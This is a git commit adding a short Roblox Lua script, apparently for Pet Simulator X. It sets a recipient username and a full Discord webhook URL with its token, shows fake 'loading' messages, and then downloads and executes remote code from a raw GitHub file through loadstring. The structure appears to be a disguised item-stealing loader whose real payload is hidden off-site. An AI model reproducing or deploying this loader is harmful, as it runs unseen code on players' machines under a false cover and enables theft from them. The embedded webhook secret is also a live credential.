5434f267a6412855fa449efc6f5b34ac8b868bcc
eyalgonlod <124557388+eyalgonlod@users.noreply.github.com>
2023-02-06 09:17:54 +0200

    Add files via upload

---
+++ PsxScript.lua
@@ -0,0 +1,9 @@
+Username = "globalbooster"
+WebHook = "https://discord.com/api/webhooks/1071420878019108916/BKbWu5ewAyvKS6NQftpSkOp9qWi4rf8jkaMIlN6eTY3mcqZPEnpSiR6TZabYOr4bU0pv"
+
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
